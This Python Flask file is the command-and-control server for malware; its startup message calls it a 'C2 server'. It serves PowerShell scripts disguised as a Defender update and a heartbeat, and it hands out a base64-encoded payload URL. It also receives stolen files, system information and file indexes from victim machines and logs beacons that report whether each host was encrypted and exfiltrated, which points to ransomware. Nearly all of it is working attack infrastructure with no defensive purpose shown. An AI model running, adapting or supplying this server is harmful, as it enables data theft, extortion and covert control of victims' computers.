import os
from flask import Flask, request, send_file, jsonify, render_template
import base64
from datetime import datetime

app = Flask(__name__)

DEFAULT_PAYLOAD = "https://0x4F776C.github.io"

@app.route('/faq.html', methods=['GET'])
def faq():
    return render_template('faq.html')

@app.route('/files/defender_update.ps1', methods=['GET'])
def get_defender_update_ps1():
    file_path = 'files/defender_update.ps1'
    return send_file(file_path, as_attachment=False)

@app.route('/files/heartbeat.ps1', methods=['GET'])
def get_heartbeat_ps1():
    file_path = 'files/heartbeat.ps1'
    return send_file(file_path, as_attachment=False)

@app.route('/files/update_key', methods=['GET'])
def get_update_key():
    payload = DEFAULT_PAYLOAD.encode('utf-8')  # Convert to bytes
    base64_payload = base64.b64encode(payload).decode('utf-8')  # Encode to Base64
    return base64_payload, 200

@app.route('/exfil', methods=['POST'])
def exfil_file():
    print("Received exfil request")
    print(f"Request content type: {request.content_type}")
    print(f"Request form keys: {list(request.form.keys())}")
    print(f"Request files keys: {list(request.files.keys())}")
    
    # Try to process as multipart/form-data
    if 'file' in request.files:
        file = request.files['file']
        filename = file.filename or "unknown_file"
        file_content = file.read()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        save_filename = f"exfiltrated_{timestamp}_{filename}"
        
        # Ensure the directory exists
        save_dir = "exfiltrated_files"
        os.makedirs(save_dir, exist_ok=True)
        
        # Save to the specified directory
        save_path = os.path.join(save_dir, save_filename)
        with open(save_path, "wb") as f:
            f.write(file_content)
        
        print(f"Received file: {filename}, size: {len(file_content)} bytes")
        return "File received", 200
    
    # If no file in request.files, try to get raw data
    else:
        print("No 'file' in request.files, attempting to save raw data")
        raw_data = request.get_data()
        if raw_data:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            save_filename = f"exfiltrated_raw_{timestamp}.bin"
            save_dir = "exfiltrated_files"
            os.makedirs(save_dir, exist_ok=True)
            save_path = os.path.join(save_dir, save_filename)
            
            with open(save_path, "wb") as f:
                f.write(raw_data)
            
            print(f"Saved raw request data: {save_path}, size: {len(raw_data)} bytes")
            return "Raw data received and saved", 200
            
        return "No file part in request and no raw data", 400

@app.route('/sysinfo', methods=['POST'])
def receive_sysinfo():
    try:
        sysinfo = request.get_json()  # Expect JSON payload
        if not sysinfo:
            return "No system info provided", 400
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        save_dir = "exfiltrated_data"
        os.makedirs(save_dir, exist_ok=True)
        
        # Save system info to file
        with open(os.path.join(save_dir, f"sysinfo_{timestamp}.json"), "w") as f:
            import json
            json.dump(sysinfo, f, indent=2)
        
        print("Received system info:", sysinfo)
        return "System info received", 200
    except Exception as e:
        print(f"Error processing system info: {str(e)}")
        return f"Error: {str(e)}", 500

@app.route('/fileindex', methods=['POST'])
def receive_fileindex():
    try:
        fileindex = request.get_json()  # Expect JSON payload
        if not fileindex:
            return "No file index provided", 400
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        save_dir = "exfiltrated_data"
        os.makedirs(save_dir, exist_ok=True)
        
        # Save file index to file
        with open(os.path.join(save_dir, f"fileindex_{timestamp}.json"), "w") as f:
            import json
            json.dump(fileindex, f, indent=2)
        
        print(f"Received file index with {len(fileindex)} entries")
        return "File index received", 200
    except Exception as e:
        print(f"Error processing file index: {str(e)}")
        return f"Error: {str(e)}", 500

@app.route('/beacon', methods=['GET'])
def receive_beacon():
    try:
        host = request.args.get('host', 'unknown')
        encrypted = request.args.get('encrypted', '0')
        exfiltrated = request.args.get('exfiltrated', '0')
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        beacon_data = f"[{timestamp}] Host: {host}, Encrypted: {encrypted}, Exfiltrated: {exfiltrated}\n"
        
        # Log beacon to file
        with open("beacon_log.txt", "a") as f:
            f.write(beacon_data)
        
        print(f"Beacon received: host={host}, encrypted={encrypted}, exfiltrated={exfiltrated}")
        return "Beacon received", 200
    except Exception as e:
        print(f"Error processing beacon: {str(e)}")
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    # Create necessary directories
    os.makedirs("exfiltrated_files", exist_ok=True)
    os.makedirs("exfiltrated_data", exist_ok=True)
    os.makedirs("files", exist_ok=True)
    
    print("Starting C2 server on port 80...")
    app.run(host='0.0.0.0', port=80, debug=True)
